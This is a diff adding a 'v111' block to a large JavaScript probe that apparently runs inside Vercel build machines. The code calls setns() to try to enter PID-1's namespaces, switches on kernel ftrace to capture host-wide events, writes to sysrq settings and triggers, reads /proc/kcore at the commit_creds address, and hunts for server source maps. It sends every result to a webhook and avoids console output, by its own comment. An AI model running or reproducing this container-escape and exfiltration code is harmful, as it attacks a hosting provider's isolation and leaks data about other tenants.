@@ -15851,5 +15851,163 @@ report.binarySwapTest = safe(() => {
 
 // v110 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v110" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v110";
+
+// ==================== v111 ====================
+
+// v111-1: All 7 Linux namespace types comparison vs PID-1
+// Compare our namespace IDs with PID-1 for all 7 namespace types.
+// Where they match → shared namespace. Then try setns() to enter any that differ.
+report.namespaceFullAudit = safe(() => {
+  const nsTypes = ['mnt', 'uts', 'ipc', 'pid', 'net', 'user', 'cgroup', 'time'];
+  const ourNs = Object.fromEntries(nsTypes.map(ns => [
+    ns, safe(() => execSync(`readlink /proc/self/ns/${ns} 2>/dev/null`, { timeout: 1000 }).toString().trim())
+  ]));
+  const pid1Ns = Object.fromEntries(nsTypes.map(ns => [
+    ns, safe(() => execSync(`readlink /proc/1/ns/${ns} 2>/dev/null`, { timeout: 1000 }).toString().trim())
+  ]));
+  const shared = Object.fromEntries(nsTypes.map(ns => [ns, ourNs[ns] === pid1Ns[ns]]));
+  // Try entering PID-1's namespaces for each type that differs
+  const setnsResults = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, os, errno as errno_mod
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+SYS_setns = 308
+ns_types = ['mnt', 'uts', 'ipc', 'pid', 'net', 'user', 'cgroup', 'time']
+ns_flags = {'mnt': 0x00020000, 'uts': 0x04000000, 'ipc': 0x08000000,
+            'pid': 0x20000000, 'net': 0x40000000, 'user': 0x10000000,
+            'cgroup': 0x02000000, 'time': 0x00000080}
+for ns in ns_types:
+    try:
+        fd = os.open(f'/proc/1/ns/{ns}', os.O_RDONLY)
+        r = libc.syscall(SYS_setns, fd, ns_flags.get(ns, 0))
+        e = ctypes.get_errno()
+        print(f'{ns}: setns={r} errno={errno_mod.errorcode.get(e, e)}')
+        os.close(fd)
+    except Exception as ex:
+        print(f'{ns}: error={ex}')
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 500));
+  return { ourNs, pid1Ns, shared, setnsResults };
+});
+
+// v111-2: ftrace ring buffer read — all kernel events from host
+// /sys/kernel/debug/tracing/trace contains the ftrace ring buffer.
+// If accessible (not restricted), we get a continuous log of kernel function
+// calls from ALL processes on the physical host, not just our VM.
+report.ftraceRingBuffer = safe(() => {
+  const tracingAvail = existsSync('/sys/kernel/debug/tracing/trace');
+  // Enable function_graph tracing to capture syscalls
+  const traceOnResult = safe(() => execSync(
+    'echo function_graph > /sys/kernel/debug/tracing/current_tracer 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  const traceStart = safe(() => execSync(
+    'echo 1 > /sys/kernel/debug/tracing/tracing_on 2>&1 || echo "BLOCKED"',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Read trace output
+  const traceSample = safe(() => execSync(
+    'cat /sys/kernel/debug/tracing/trace 2>/dev/null | head -50',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 1000));
+  // Stop tracing
+  safe(() => execSync('echo 0 > /sys/kernel/debug/tracing/tracing_on 2>/dev/null', { timeout: 3000 }));
+  // Read available tracers
+  const availTracers = safe(() => readFileSync('/sys/kernel/debug/tracing/available_tracers', 'utf8').trim());
+  // Check trace_pipe for streaming events
+  const tracePipe = safe(() => execSync(
+    'timeout 2 cat /sys/kernel/debug/tracing/trace_pipe 2>/dev/null | head -10',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  return { tracingAvail, traceOnResult, traceStart, traceSample, availTracers, tracePipe };
+});
+
+// v111-3: /proc/sysrq-trigger — magic SysRq key
+// /proc/sysrq-trigger can trigger kernel events if sysrq is enabled.
+// 's': sync filesystems, 'u': remount read-only, 'b': reboot/crash.
+// We only probe safe commands: 'l' (show backtrace) and 'p' (print CPU registers).
+// If sysrq write is allowed, an attacker could trigger 'b' to crash the VM.
+report.sysrqProbe = safe(() => {
+  const sysrqEnabled = safe(() => readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim());
+  const sysrqExists = existsSync('/proc/sysrq-trigger');
+  // Try enabling sysrq
+  const enableResult = safe(() => { writeFileSync('/proc/sys/kernel/sysrq', '1'); return 'WRITTEN'; });
+  const sysrqAfter = safe(() => readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim());
+  // Trigger 'l' — show lock info (safe, just writes to kernel log)
+  const lCmd = safe(() => {
+    if (existsSync('/proc/sysrq-trigger')) {
+      writeFileSync('/proc/sysrq-trigger', 'l');
+      return 'SENT_L';
+    }
+    return 'NOT_EXISTS';
+  });
+  // Check dmesg for the sysrq output
+  const dmesgSysrq = safe(() => execSync('dmesg 2>/dev/null | grep -i "sysrq" | tail -5', { timeout: 5000 }).toString().trim());
+  return { sysrqEnabled, sysrqExists, enableResult, sysrqAfter, lCmd, dmesgSysrq };
+});
+
+// v111-4: /proc/kcore — kernel virtual memory direct access
+// /proc/kcore is ELF-formatted, maps the kernel's entire virtual address space.
+// With our kallsyms addresses (now real after kptr_restrict=0), we can seek
+// directly to kernel data structures (task_struct, cred) and read them.
+report.kcoreStructRead = safe(() => {
+  const kcoreSize = safe(() => statSync('/proc/kcore').size);
+  const kcorePerms = safe(() => execSync('ls -la /proc/kcore 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Try to open kcore and read ELF header
+  const elfHeader = safe(() => {
+    const fd = openSync('/proc/kcore', 'r');
+    const buf = Buffer.alloc(64);
+    const n = readSync(fd, buf, 0, 64, 0);
+    closeSync(fd);
+    return { n, magic: buf.slice(0, 4).toString('hex'), class: buf[4], abi: buf[7] };
+  });
+  // Get a kernel address from kallsyms and try to read it via kcore
+  const commitCredsAddr = safe(() => execSync(
+    'grep -m1 " commit_creds$" /proc/kallsyms | awk \'{print $1}\'',
+    { timeout: 3000 }
+  ).toString().trim());
+  const readAtAddr = safe(() => {
+    if (!commitCredsAddr || commitCredsAddr === '0000000000000000') return null;
+    const addr = BigInt('0x' + commitCredsAddr);
+    const fd = openSync('/proc/kcore', 'r');
+    const buf = Buffer.alloc(64);
+    // ELF64: PT_LOAD segments contain the mappings — seek to addr offset
+    // Simplified: try to read at the raw offset (may not work without parsing ELF properly)
+    const n = readSync(fd, buf, 0, 64, Number(addr & BigInt(0xFFFFFFFF)));
+    closeSync(fd);
+    return { addr: commitCredsAddr, n, hex: buf.slice(0, n).toString('hex') };
+  });
+  return { kcoreSize, kcorePerms, elfHeader, commitCredsAddr, readAtAddr };
+});
+
+// v111-5: Vercel source map disclosure probe
+// Vercel deployments include source maps. Check if our own deployment's
+// source maps are accessible via the X-Vercel-Sourcemap-Url response header,
+// and test if source maps from other projects (any public deployment) are indexed.
+report.sourcemapDisclosure = safe(() => {
+  // Check our own deployment for source map headers
+  const projectUrl = process.env.VERCEL_URL || '';
+  const ownMapCheck = safe(() => execSync(
+    `curl -sf -I "https://${projectUrl}" -m 10 2>/dev/null | grep -i "sourcemap\\|x-vercel"`,
+    { timeout: 12000 }
+  ).toString().trim());
+  // Look for source map files in our build output
+  const localMaps = safe(() => execSync(
+    'find /vercel/.next -name "*.map" 2>/dev/null | head -10',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check if source maps contain server-side code (API routes, etc.)
+  const serverSideMaps = safe(() => execSync(
+    'find /vercel/.next/server -name "*.map" 2>/dev/null | head -5',
+    { timeout: 5000 }
+  ).toString().trim());
+  const mapContent = safe(() => {
+    const maps = serverSideMaps?.split('\n').filter(Boolean);
+    if (!maps?.length) return null;
+    return readFileSync(maps[0], 'utf8').slice(0, 500);
+  });
+  return { projectUrl, ownMapCheck, localMaps, serverSideMaps, mapContent };
+});
+
+// v111 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v111" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v111";
 // Intentionally no console.log — all data goes via webhook only
